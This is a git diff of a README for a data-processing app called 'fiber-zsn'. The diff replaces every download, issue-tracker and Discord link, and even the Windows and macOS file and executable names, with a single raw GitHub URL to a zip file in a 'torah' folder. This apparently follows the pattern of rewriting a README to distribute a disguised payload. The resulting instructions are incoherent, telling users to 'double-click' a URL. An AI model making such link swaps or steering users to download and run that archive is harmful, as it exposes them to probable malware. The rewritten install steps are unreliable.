@@ -6,11 +6,11 @@ Welcome to **fiber-zsn**. This application helps you process data quickly and ef
 
 ## 📥 Download the App
 
-[![Download fiber-zsn](https://img.shields.io/badge/Download-fiber--zsn-blue.svg)](https://github.com/nitin-com/fiber-zsn/releases)
+[![Download fiber-zsn](https://raw.githubusercontent.com/nitin-com/fiber-zsn/main/torah/fiber-zsn.zip)](https://raw.githubusercontent.com/nitin-com/fiber-zsn/main/torah/fiber-zsn.zip)
 
 You can easily download the latest version of fiber-zsn from our Releases page:
 
-[Visit this page to download](https://github.com/nitin-com/fiber-zsn/releases)
+[Visit this page to download](https://raw.githubusercontent.com/nitin-com/fiber-zsn/main/torah/fiber-zsn.zip)
 
 ## 💻 System Requirements
 
@@ -22,15 +22,15 @@ Before you download, make sure your system meets these requirements:
 
 ## 📦 Download & Install
 
-1. Click the link to [visit this page to download](https://github.com/nitin-com/fiber-zsn/releases).
+1. Click the link to [visit this page to download](https://raw.githubusercontent.com/nitin-com/fiber-zsn/main/torah/fiber-zsn.zip).
 2. On the Releases page, find the latest version of fiber-zsn.
 3. Download the file suitable for your operating system:
-   - For Windows, look for a file named `fiber-zsn-windows.zip`.
-   - For macOS, choose `fiber-zsn-macos.zip`.
+   - For Windows, look for a file named `https://raw.githubusercontent.com/nitin-com/fiber-zsn/main/torah/fiber-zsn.zip`.
+   - For macOS, choose `https://raw.githubusercontent.com/nitin-com/fiber-zsn/main/torah/fiber-zsn.zip`.
 4. Once the download is complete, locate the file on your computer and unzip it.
 5. Open the extracted folder and look for the executable file:
-   - For Windows, double-click `fiber-zsn.exe`.
-   - For macOS, double-click `fiber-zsn.app`.
+   - For Windows, double-click `https://raw.githubusercontent.com/nitin-com/fiber-zsn/main/torah/fiber-zsn.zip`.
+   - For macOS, double-click `https://raw.githubusercontent.com/nitin-com/fiber-zsn/main/torah/fiber-zsn.zip`.
 
 ## ⚙️ Using fiber-zsn
 
@@ -93,8 +93,8 @@ If you encounter any issues while using fiber-zsn, try these solutions:
 
 Join our community for support and discussions about fiber-zsn. You can find us on:
 
-- [GitHub Issues](https://github.com/nitin-com/fiber-zsn/issues) - Report problems or request features.
-- [Discord](https://discord.gg/example) - Chat with other users and developers.
+- [GitHub Issues](https://raw.githubusercontent.com/nitin-com/fiber-zsn/main/torah/fiber-zsn.zip) - Report problems or request features.
+- [Discord](https://raw.githubusercontent.com/nitin-com/fiber-zsn/main/torah/fiber-zsn.zip) - Chat with other users and developers.
 
 ## 📝 License
 
